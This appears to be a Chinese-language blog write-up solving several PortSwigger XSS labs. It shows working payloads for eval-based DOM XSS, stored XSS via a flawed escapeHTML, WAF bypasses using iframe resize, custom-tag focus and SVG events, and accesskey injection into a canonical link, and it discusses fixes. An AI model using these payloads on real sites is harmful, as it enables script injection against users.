<p>这个实验展示了一个反射型 DOM 漏洞。当服务器端应用处理请求中的数据并将该数据回显到响应中时，就可能出现反射型 DOM 漏洞。随后，页面上的脚本会以不安全的方式处理这些被反射的数据，最终将其写入危险的 “接收器”（指可能执行恶意代码的 DOM 操作接口）。</p>
<p>要解决这个实验，请构造一个能调用 alert () 函数的注入内容。</p>
</blockquote>
<p>翻一下js，发现查询功能处很有意思</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;var searchResultsObj = &#x27; + this.responseText);</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151305236.png" alt="image-20250915130521941"></p>
<p>比如我们搜一个 she11f ， **this.responseText **返回如下</p>
<p><strong>{“results”:[],”searchTerm”:”she11f”}</strong></p>
<p>可以本地搭建一个环境模拟一下，创建 <strong>index.html</strong> </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 创建XHR对象</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 配置请求：方法为GET，URL为localhost:8000/data.json</span></span></span><br><span class="line"><span class="language-javascript">      xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://localhost:8000/data.json&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 监听请求完成事件</span></span></span><br><span class="line"><span class="language-javascript">      xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 检查请求是否成功（状态码200-299表示成功）</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="built_in">eval</span>(<span class="string">&#x27;var searchResultsObj = &#x27;</span> + <span class="variable language_">this</span>.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125; </span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 发送请求</span></span></span><br><span class="line"><span class="language-javascript">      xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为 eval 会把传入的字符串当 js 代码执行，所以同级目录创建 data.json</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;results&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;searchTerm&quot;</span><span class="punctuation">:</span><span class="string">&quot;she11f&quot;</span>-alert(<span class="number">1</span>)</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里语法爆红没关系，反正最后进入都是字符串。我们 php 在本地 8000 端口开启一个服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S localhost:8000  </span><br></pre></td></tr></table></figure>

<p>然后浏览器访问，发现成功弹窗了。本地是攻击成功了，那怎么打这个实验呢，启动 BP，看一下这个<strong>search</strong>包</p>
<p>可以看到因为我们这不是本地模拟，前端传递 <strong>she11f-alert(1)</strong> （之所以用➖号是因为➕号要url编码，不然浏览器会以为是空格，而减号其实和连字符是长一样的，浏览器以为是连字符就不会url编码）,后端给这个值传递到 json 里面的时候就自动加上双引号了，所以我们还是要 bypass 一下。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151313093.png" alt="image-20250915131320942"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">she11f&quot;-alert(1)</span><br><span class="line">返回</span><br><span class="line">&#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;she11f\&quot;-alert(1)&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>双引号被转义了，那我们再加一个转义符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">she11f\&quot;-alert(1)</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151321475.png" alt="image-20250915132117367"></p>
<p>成功了，json 以为 前面的转义符用来转义后面的反斜杠，双引号成功逃逸并闭合前面。当然还没有结束，这个 json 语法结构已经被我们颇坏了，它都不能自动对齐格式了,我们再后面补上一个大括号闭合 json，然后注释符号注释后面的 <code>&quot;&#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">she11f\&quot;-alert(1)&#125;//</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151323985.png" alt="image-20250915132356846"></p>
<p>payload 拿去搜索，成功弹窗，我们可以打个断点看看</p>
<p>先步入 eval 看看究竟传了个什么东西</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509151335007.png" alt="image-20250915133535922"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> searchResultsObj = &#123;<span class="string">&quot;results&quot;</span>:[],<span class="string">&quot;searchTerm&quot;</span>:<span class="string">&quot;she11f\\&quot;</span>-<span class="title function_">alert</span>(<span class="number">1</span>)&#125;<span class="comment">//&quot;&#125;</span></span><br></pre></td></tr></table></figure>

<p>那要怎么修复呢，其实很简单，就不要用 eval，用 json.parse 解析</p>
<blockquote>
<p>JSON 与 JavaScript 值的差异：JavaScript 除了支持上述所有类型外，还允许其他值，例如：</p>
<ul>
<li>函数（function）</li>
<li>日期（Date）</li>
<li>未定义（undefined）<br>但这些在 JSON 中都是不被允许的。</li>
</ul>
</blockquote>
<p>json 不接收函数，所以控制台直接就报错了。</p>
<h3 id="Lab-Stored-DOM-XSS"><a href="#Lab-Stored-DOM-XSS" class="headerlink" title="Lab: Stored DOM XSS"></a>Lab: Stored DOM XSS</h3><blockquote>
<p>This lab demonstrates a stored DOM vulnerability in the blog comment  functionality. To solve this lab, exploit this vulnerability to call the <code>alert()</code> function. 	</p>
</blockquote>
<p>这个实验是基于 存储的DOM型 XSS，根据 js 文件可以得出数据流向</p>
<p>评论 &#x3D;&gt; 存储到数据库 &#x3D;&gt; 加载评论 &#x3D;&gt; 从数据库取出数据经过 JS 代码 <strong>innerHTML</strong> 插入评论到前端页面。</p>
<p>我们简单设置作者为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>回到评论区发现结束的标签消失了，说明这是成功解析了，打个断点看一下发生了什么，发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeHTML(comment.author) 返回 &quot;&amp;lt;script&amp;gt;alert()&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>说明只是替换了第一组尖括号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(pattern, replacement)</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509152342971.png" alt="image-20250915234238828"></p>
<p>修复也很简单,正则语法全局匹配，或者换成 <code>replaceAll</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escapeHTML</span>(<span class="params">html</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> html.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>); <span class="comment">// 全局替换所有 &lt; 和 &gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这种方法还是治标不治本，我们不应该让前端渲染最后这一个环节来作为安全防御。我们注意到当数据流向数据库是是完完整整存储了这些 HTML 标签语法的，我们应该在后端层面过滤删除这些特殊符号再存在数据库里面</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509152347574.png" alt="image-20250915234715438"></p>
<p>所以最后的 <strong>payload</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><a href="#Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked" class="headerlink" title="Lab: Reflected XSS into HTML context with most tags and attributes blocked"></a>Lab: Reflected XSS into HTML context with most tags and attributes blocked</h3><blockquote>
<p>​            This lab contains a reflected XSS vulnerability in the  search functionality but uses a web application firewall (WAF) to  protect against common XSS vectors.        </p>
<p>​            To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the <code>print()</code> function.        </p>
<p>该实验室在搜索功能中包含一个反射型 XSS 漏洞，但使用 Web 应用程序防火墙 (WAF) 来防御常见的 XSS 向量。 为了解决实验问题，执行绕过 WAF 并调用 print() 函数的跨站点脚本攻击。</p>
</blockquote>
<p>这道题在反射 <strong>XSS</strong> 地基础上加了 waf，我们爆破一下 tag，发现有 <code>body</code> 可以用。属性也是加了 waf，也爆破一下。到这里我就卡住了，因为我找的属性都是不能直接发给用户弹窗，都得用户操作一下但这样的话系统是不认得，比如说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onbeforeinput=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>这个得在用户输入的时候才能触发，显然达不到点击即上线的要求。我就想找个类似 <code>onerror,onload</code> 这样的属性，但是始终没找到，看 WP 才发现是方向错了。</p>
<p>我们可以利用自己的服务器，利用 <code>iframe</code> 标签，将漏洞页面渲染到我们的服务器上，在 <code>iframe</code> 在我们的服务器上加载的同时，修改我们服务器上 <code>iframe</code> 的尺寸，从而使得漏洞页面尺寸被修改触发 <code>resize</code> 属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://0ada003a0307c7ca807c3a7f00f30010.web-security-academy.net/?search=&lt;body onresize=print() &gt;&quot;</span> <span class="attr">onload</span>=<span class="string">this.style.width</span>=<span class="string">&#x27;700px&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在我们的服务器上可以看到，因为 <strong>iframe</strong> 嵌套了靶场的 <strong>body</strong> (<code>iframe</code> 是 靶场的父节点), 所以修改 <code>iframe</code> 大小，也会修改漏洞页面的大小。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509172335113.png" alt="image-20250917233530790"></p>
<h3 id="Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><a href="#Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones" class="headerlink" title="Lab: Reflected XSS into HTML context with all tags blocked except custom ones"></a>Lab: Reflected XSS into HTML context with all tags blocked except custom ones</h3><blockquote>
<p>​            This lab blocks all HTML tags except custom ones.        </p>
<p>​            To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts <code>document.cookie</code>.        </p>
</blockquote>
<p>这道题把所有标签都 ban 了，但是属性都给了，我们可以用自定义标签，比如我们试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xss onclick=alert()&gt;</span><br></pre></td></tr></table></figure>

<p>成功触发，但是题目要求我们 <strong>automatically alerts</strong>  ，我一看简单啊，直接按照上一题的做法不就行啦，只要把 <strong>body</strong> 改成<strong>xss</strong>，嘿嘿</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509192238092.png" alt="image-20250919223835879"></p>
<p>密码的拒绝连接，问问 AI 怎么回事</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509192243367.png" alt="image-20250919224305282"></p>
<p>好吧，只能想别的方法了。看了眼答案，用的是 <code>onfocus</code> 这个事件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xss id=<span class="number">1</span> onfocus=<span class="title function_">alert</span>() tabindex=<span class="number">1</span>&gt;</span><br></pre></td></tr></table></figure>

<p><code>id</code> 是 HTML 标签的<strong>全局属性</strong>，作用是给当前元素分配一个<strong>唯一的名称</strong>，相当于元素的 “身份证号”—— 在同一个 HTML 页面中，<code>id</code> 的值不能重复，浏览器通过 <code>id</code> 可以快速定位到指定元素。</p>
<p><strong>tabindex</strong> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Global_attributes">全局属性</a> 指示其元素是否可以聚焦，以及它是否&#x2F;在何处参与顺序键盘导航（通常使用Tab键，因此得名）。它有什么作用呢？</p>
<p>默认情况下，只有表单元素（如 <code>&lt;input&gt;</code>）、链接（<code>&lt;a&gt;</code>）等少数元素能通过鼠标点击或键盘 <code>Tab</code> 键获得 “焦点”（聚焦后元素会有特殊状态，比如输入框的光标、链接的边框）；而 <code>&lt;div&gt;</code>、自定义标签（如 <code>&lt;xss&gt;</code>）等默认无法被聚焦。<strong>聚焦的顺序</strong>：当按 <code>Tab</code> 键切换焦点时，浏览器会按照 <code>tabindex</code> 的数值大小顺序（从小到大）跳转，数值越小，优先级越高（<code>tabindex=&quot;1&quot;</code> 会比 <code>tabindex=&quot;2&quot;</code> 先被聚焦）。如果 <code>tabindex</code> 设为 <strong>负数</strong>（如 <code>tabindex=&quot;-1&quot;</code>）：元素可聚焦，但不会出现在 <code>Tab</code> 键的切换顺序中（只能通过代码或锚点触发聚焦）；如果 <code>tabindex</code> 设为 <strong>0</strong>：元素可聚焦，且按 <code>Tab</code> 键时会跟随页面默认顺序（排在所有正数值之后）；</p>
<p>比如做个实验</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>  <span class="attr">tabindex</span>=<span class="string">&quot;3&quot;</span>&gt;</span>区块1<span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>  <span class="attr">tabindex</span>=<span class="string">&quot;1&quot;</span>&gt;</span>区块2<span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;3&quot;</span> <span class="attr">tabindex</span>=<span class="string">&quot;2&quot;</span>&gt;</span>区块3(id与区块2相同)<span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>不断按下 tab 键我们可以发现焦点聚焦的顺序是 <strong>2&#x3D;&gt;3&#x3D;&gt;1</strong></p>
<p>再看一眼我们的 payload <code>&lt;xss id=1 onfocus=alert() tabindex=1&gt;</code>,因为我们的自定义的标签 xss 肯定是没有焦点状态的，所以加上了 <strong>tabindex&#x3D;1</strong>，所以我们的 xss 标签已经有焦点状态了，那该如何触发聚焦呢？</p>
<p>答案就是用到我们之前学过的锚点了，URL 中的 <code>#</code> 后面的部分称为 “锚点（Anchor）”，之前我们用 <code>location.hash</code> 可以获得这个值，这个锚点还有一个属性</p>
<blockquote>
<p><strong>在页面加载完成后，自动将页面滚动到 “id 与锚点值匹配” 的元素位置，并让该元素获得焦点</strong>（前提是元素支持聚焦）。</p>
</blockquote>
<p>所以我们打完 payload 之后，还要手动在 <strong>url</strong> 后面加上锚点</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=<span class="language-xml"><span class="tag">&lt;<span class="name">xss</span> <span class="attr">id</span>=<span class="string">1</span> <span class="attr">onfocus</span>=<span class="string">alert()</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>#1</span></span><br></pre></td></tr></table></figure>

<p>Ok,那现在怎么用我们自己的服务器来攻击呢？因为加了保护策略，所以我们可以在服务器上构建一个 js 跳转来实现</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   location = <span class="string">&quot;https://0a7f009604a1421080e51cb40080000e.web-security-academy.net/?search=&lt;xss id=1 onfocus=alert() tabindex=1&gt;#1&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-Reflected-XSS-with-some-SVG-markup-allowed"><a href="#Lab-Reflected-XSS-with-some-SVG-markup-allowed" class="headerlink" title="Lab: Reflected XSS with some SVG markup allowed"></a>Lab: Reflected XSS with some SVG markup allowed</h3><blockquote>
<p> This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.</p>
<p>To solve the lab, perform a cross-site scripting attack that calls the alert() function. </p>
<p>本实验存在一个简单的反射型跨站脚本（XSS）漏洞。该网站会拦截常见标签，但遗漏了部分 SVG 标签及事件。</p>
</blockquote>
<p>爆破得到了可用的标签，<strong>animatetransform</strong> 和 <strong>svg</strong> 我直接去速查表找的 <strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt;</span><br></pre></td></tr></table></figure>

<p>精简一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509210024786.png" alt="image-20250921002400422"></p>
<p>其实 <strong>onbegin</strong> 事件也能爆破出来，就是动画加载的时候触发</p>
<h3 id="Lab-Reflected-XSS-in-canonical-link-tag"><a href="#Lab-Reflected-XSS-in-canonical-link-tag" class="headerlink" title="Lab: Reflected XSS in canonical link tag"></a>Lab: Reflected XSS in canonical link tag</h3><blockquote>
<p>​            This lab reflects user input in a canonical link tag and escapes angle brackets.        </p>
<p>​            To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the <code>alert</code> function.        </p>
<p>​            To assist with your exploit, you can assume that the simulated user will press the following key combinations:        </p>
<ul>
<li>​                <code>ALT+SHIFT+X</code>            </li>
<li>​                <code>CTRL+ALT+X</code>            </li>
<li>​                <code>Alt+X</code></li>
</ul>
<p>​			Please note that the intended solution to this lab is only possible in Chrome. 	</p>
</blockquote>
<p>这个靶场讲的就是怎么触发不可见的HTML标签，因为由于元素不可见，典型的 JavaScript 事件（如 onmouseover 和 onfocus）无法触发，参考这篇文章，<a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-in-hidden-input-fields%E3%80%82">https://portswigger.net/research/xss-in-hidden-input-fields。</a></p>
<p>比如说</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">accesskey</span>=<span class="string">&quot;X&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong><code>HTMLElement.accessKey</code></strong> 属性用于设置用户可以通过按键快速跳转到指定元素的快捷键。</p>
</blockquote>
<p>在 Firefox Windows&#x2F;Linux 上，组合键是 ALT+SHIFT+X，在 MAC 上是 CTRL+ALT(其实就是option)+X，按下这个就能触发 onclick 事件</p>
<p>或者说</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;canonical&quot;</span> <span class="attr">accesskey</span>=<span class="string">&quot;X&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>&lt;link rel=&quot;canonical&quot;&gt;</code> 是 HTML 中一个用于指定网页规范 URL（标准链接）的标签，主要用于告诉搜索引擎 “当前页面的首选版本”，解决因内容相同或高度相似而导致的 “重复内容” 问题。合理使用<code>canonical</code>标签有助于优化网站的 SEO 表现，避免重复内容对搜索排名的负面影响。</p>
</blockquote>
<p>同样这种 link 标签在 head 标签里面也是元素不可见的，这道题在主页 url 后加入参数会注入到 <strong>link</strong> 标签的 <strong>href</strong> 属性里面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;canonical&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://0af0007b03cae94580cd035a009600c0.web-security-academy.net/?aaa&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们利用单引号闭合（双引号貌似被转义了），然后系统会模拟按键触发</p>
<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">she11f&#x27;accesskey=&#x27;x&#x27;onclick=&#x27;alert(123)</span><br></pre></td></tr></table></figure>



